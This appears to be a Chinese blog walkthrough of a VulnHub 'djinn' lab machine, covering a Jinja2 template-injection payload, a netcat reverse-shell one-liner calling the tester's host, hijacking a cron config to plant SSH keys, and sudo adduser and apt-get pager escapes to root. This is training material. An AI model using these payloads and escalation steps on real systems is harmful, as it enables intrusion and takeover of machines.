+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118185159.png" alt=""></p>
+<p>目录扫描无结果</p>
+<p>5000端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118185457.png" alt=""></p>
+<p>点击link</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118185701.png" alt=""></p>
+<p>对id参数测试无结果</p>
+<p>31337端口需要登录认证</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118190637.png" alt=""></p>
+<h3 id="Getshell-1"><a href="#Getshell-1" class="headerlink" title="Getshell"></a>Getshell</h3><p>观察5000端口页面信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118191111.png" alt=""></p>
+<p>提到存在一个guest用户，登录试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118191259.png" alt=""></p>
+<p>发现利用open命令新建一个ticket会直接显示在5000端口的页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118191721.png" alt=""></p>
+<p>试试命令注入，插入php代码和命令均无果</p>
+<p>翻回去看，信息搜集没做好，nmap没探测清楚5000端口的命令，重新探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-11-18 06:25 EST</span><br><span class="line">Nmap scan report for 192.168.117.40</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)</span><br><span class="line">|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)</span><br><span class="line">|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    lighttpd 1.4.45</span><br><span class="line">|_http-server-header: lighttpd&#x2F;1.4.45</span><br><span class="line">|_http-title: Custom-ers</span><br><span class="line">5000&#x2F;tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)</span><br><span class="line">|_http-server-header: Werkzeug&#x2F;1.0.1 Python&#x2F;3.6.9</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;utf-8).</span><br><span class="line">31337&#x2F;tcp open  Elite?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: </span><br><span class="line">|     username&gt;</span><br><span class="line">|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: </span><br><span class="line">|     username&gt; password&gt; authentication failed</span><br><span class="line">|   Help: </span><br><span class="line">|     username&gt; password&gt;</span><br><span class="line">|   RPCCheck: </span><br><span class="line">|     username&gt; Traceback (most recent call last):</span><br><span class="line">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 105, in &lt;module&gt;</span><br><span class="line">|     main()</span><br><span class="line">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 93, in main</span><br><span class="line">|     username &#x3D; input(&quot;username&gt; &quot;)</span><br><span class="line">|     File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;codecs.py&quot;, line 321, in decode</span><br><span class="line">|     (result, consumed) &#x3D; self._buffer_decode(data, self.errors, final)</span><br><span class="line">|     UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0x80 in position 0: invalid start byte</span><br><span class="line">|   SSLSessionReq: </span><br><span class="line">|     username&gt; Traceback (most recent call last):</span><br><span class="line">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 105, in &lt;module&gt;</span><br><span class="line">|     main()</span><br><span class="line">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 93, in main</span><br><span class="line">|     username &#x3D; input(&quot;username&gt; &quot;)</span><br><span class="line">|     File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;codecs.py&quot;, line 321, in decode</span><br><span class="line">|     (result, consumed) &#x3D; self._buffer_decode(data, self.errors, final)</span><br><span class="line">|     UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xd7 in position 13: invalid continuation byte</span><br><span class="line">|   TerminalServerCookie: </span><br><span class="line">|     username&gt; Traceback (most recent call last):</span><br><span class="line">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 105, in &lt;module&gt;</span><br><span class="line">|     main()</span><br><span class="line">|     File &quot;&#x2F;opt&#x2F;.tick-serv&#x2F;tickets.py&quot;, line 93, in main</span><br><span class="line">|     username &#x3D; input(&quot;username&gt; &quot;)</span><br><span class="line">|     File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;codecs.py&quot;, line 321, in decode</span><br><span class="line">|     (result, consumed) &#x3D; self._buffer_decode(data, self.errors, final)</span><br><span class="line">|_    UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xe0 in position 5: invalid continuation byte</span><br></pre></td></tr></table></figure>
+
+<p>编程语言是python，会将输入的信息显示到网页，考虑ssti模板注入</p>
+<p>open创建一个测试ticket</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118193246.png" alt=""></p>
+<p>成功回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118193312.png" alt=""></p>
+<p>那么利用ssti命令执行</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118195456.png" alt=""></p>
+<p>那么弹个shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.118.104 8888 &gt;&#x2F;tmp&#x2F;f&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118195735.png" alt=""></p>
+<h3 id="ssh免密登录"><a href="#ssh免密登录" class="headerlink" title="ssh免密登录"></a>ssh免密登录</h3><p>home用户下存在三个用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118202611.png" alt=""></p>
+<p>发现opt目录下还有两个pyc文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201118203912.png" alt=""></p>
+<p>下载下来反编译看看</p>
+<p>.configuration.cpython-38.pyc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, json</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime <span class="keyword">as</span> dt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigReader</span>:</span></span><br><span class="line">    config = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_config</span><span class="params">(path)</span>:</span></span><br><span class="line">        <span class="string">"""Reads the config file</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        config_values = &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(path, <span class="string">'r'</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                config_values = json.load(f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">"Couldn't properly parse the config file. Please use properl"</span>)</span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> config_values</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_config_path</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">"""Set the config path</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        files = glob(<span class="string">'/home/saint/*.json'</span>)</span><br><span class="line">        other_files = glob(<span class="string">'/tmp/*.json'</span>)</span><br><span class="line">        files = files + other_files</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> len(files) &gt; <span class="number">2</span>:</span><br><span class="line">                files = files[:<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1 = os.path.basename(files[<span class="number">0</span>]).split(<span class="string">'.'</span>)</span><br><span class="line">                file2 = os.path.basename(files[<span class="number">1</span>]).split(<span class="string">'.'</span>)</span><br><span class="line">                <span class="keyword">if</span> file1[(<span class="number">-2</span>)] == <span class="string">'config'</span>:</span><br><span class="line">                    <span class="keyword">if</span> file2[(<span class="number">-2</span>)] == <span class="string">'config'</span>:</span><br><span class="line">                        a = dt.strptime(file1[<span class="number">0</span>], <span class="string">'%d-%m-%Y'</span>)</span><br><span class="line">                        b = dt.strptime(file2[<span class="number">0</span>], <span class="string">'%d-%m-%Y'</span>)</span><br><span class="line">                <span class="keyword">if</span> b &lt; a:</span><br><span class="line">                    filename = files[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    filename = files[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure>
+
+<p>两个函数，read_config读取路径下config文件，set_config_path搜索对应路径下以json格式结尾的两个文件，将文件名以<code>.</code>为间隔分为数组，使用strptime函数处理获取文件的时间为日期格式，使得file1,file为形如<code>[&#39;xx-xx-xx&#39;,&#39;config&#39;,&#39;.json&#39;]</code>的格式，比较两个文件的时间，若是/tmp文件下文件较早，返回home目录下json文件，相反返回/tmp目录下json文件</p>
+<p>.syncer.cpython-38.pyc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> configuration <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.ftpconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.sshconn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> connectors.utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Main function</span></span><br><span class="line"><span class="string">    Cron job is going to make my work easy peasy</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    configPath = ConfigReader.set_config_path()</span><br><span class="line">    config = ConfigReader.read_config(configPath)</span><br><span class="line">    connections = checker(config)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'FTP'</span> <span class="keyword">in</span> connections:</span><br><span class="line">        ftpcon(config[<span class="string">'FTP'</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'SSH'</span> <span class="keyword">in</span> connections:</span><br><span class="line">            sshcon(config[<span class="string">'SSH'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'URL'</span> <span class="keyword">in</span> connections:</span><br><span class="line">                sync(config[<span class="string">'URL'</span>], config[<span class="string">'Output'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>main函数根据文件内容选择连接方式</p>
+<p>通过上传的工具查看进程可以知道saint目录下会定时执行脚本文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120191604.png" alt=""></p>
+<p>猜测是执行上面两个脚本，已知文件格式，尝试构造文件，利用main的连接方式进行ssh免密登录</p>
+<p>首先<code>ssh-keygen</code>在本机生成一个公私钥对</p>
+<p>复制id_rsa.pub内容，新建一个authorized_keys文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120195048.png" alt=""></p>
+<p>创建<code>20-11-2020.config.json</code>文件，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;URL&quot;:&quot;http:&#x2F;&#x2F;192.168.118.108:9901&#x2F;authorized_keys&quot;,</span><br><span class="line">        &quot;Output&quot;:&quot;&#x2F;home&#x2F;saint&#x2F;.ssh&#x2F;authorized_keys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>完成后本地python开一个http服务器等待</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120195322.png" alt=""></p>
+<p>靶机tmp目录wget下载json文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120194247.png" alt=""></p>
+<p>这样，脚本执行时就会下载本机的key再输出覆盖到saint用户的key，从而实行远程ssh免密登录</p>
+<p>等待saint用户home下脚本执行，成功ssh登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120195728.png" alt=""></p>
+<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p><code>sudo -l</code>可以免密执行adduser</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120200055.png" alt=""></p>
+<p>可以添加root组用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120200322.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120200445.png" alt=""></p>
+<h3 id="查看sudoers文件"><a href="#查看sudoers文件" class="headerlink" title="查看sudoers文件"></a>查看sudoers文件</h3><p>有了root权限，可以查看其他可以执行sudo组命令的文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201350.png" alt=""></p>
+<p>jason用户不存在，返回saint用户创建</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201453.png" alt=""></p>
+<h3 id="apt-get提权"><a href="#apt-get提权" class="headerlink" title="apt-get提权"></a>apt-get提权</h3><p>apt除了可以安装包之外</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201816.png" alt=""></p>
+<p>查看它的帮助选项</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201922.png" alt=""></p>
+<p>有个changelog命令可以展示目标包的变更日志，并且测试发现是分页模式下阅读</p>
+<p>之前已经学到，如果我们在这种分页状态下输入诸如<code>!+command</code>的指令，命令就会执行</p>
+<p>输入<code>sudo apt-get changelog tree</code>，在分页模式下输入bash</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120202928.png" alt=""></p>
+<p>成功执行，拿到root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120203054.png" alt=""></p>
+<p>完成</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120203122.png" alt=""></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/11/20/vulnhub_djinn/">http://www.blacknight.top/2020/11/20/vulnhub_djinn/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/10/25/vulnhub_DC/">vulnhub——DC系列</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+    <!-- Chic/layout.ejs -->
+    <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+</body>
+</html>
